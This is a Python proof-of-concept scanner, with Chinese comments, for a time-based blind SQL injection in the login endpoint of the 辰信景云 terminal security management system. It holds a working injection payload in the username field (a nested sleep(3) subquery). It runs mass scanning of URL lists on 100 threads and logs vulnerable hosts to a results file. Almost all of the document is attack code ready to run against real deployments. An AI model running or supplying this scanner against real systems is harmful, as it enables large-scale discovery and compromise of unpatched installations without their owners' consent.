# 导包
import argparse
import requests
import sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 指纹模块
def banner():
    banner = '''
  _______              _  ___        ________    __ 
 / ___/ /  ___ ___    | |/_(_)__    / __/ __ \\  / / 
/ /__/ _ \\/ -_) _ \\  _>  </ / _ \\  _\\ \\/ /_/ / / /__
\\___/_//_/\\__/_//_/ /_/|_/_/_//_/ /___/\\___\\_\\/____/

'''
    print(banner)

# poc模块
def poc(target):
    url = target + "/api/user/login"
    headers = {
        "Cookie": "vsecureSessionID=201af681393e4cc13d30555869203394",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Length": "102",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Te": "trailers",
    }
    data = "captcha:&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(3))a)='"
    try:
        res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=10)
        if res.elapsed.total_seconds() >= 3:
            print(f"[+] 这个url存在SQL注入: {target}")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + " 存在SQL注入\n")
        else:
            print(f"[-] 这个url不存在SQL注入: {target}")
    except requests.RequestException as e:
        print(f"请求错误: {e}")
    except Exception as e:
        print(f"其他错误: {e}")

# 主函数模块
def main():
    banner()
    '''命令行接收参数'''
    parse = argparse.ArgumentParser(description="这是辰信景云终端安全管理系统 login SQL注入的poc")
    #  -u 单个检测   -f 批量检测
    parse.add_argument('-u', '--url', dest='url', type=str, help="url")
    parse.add_argument('-f', '--file', dest='file', type=str, help='url.txt')
    # 调用
    args = parse.parse_args()

    # 处理命令行参数的事情
    # 判断是单个的url还是txt文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        # 定义线程池为100
        with Pool(100) as mp:
            # 将列表参数输入到poc中利用
            mp.map(poc, url_list)
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == "__main__":
    main()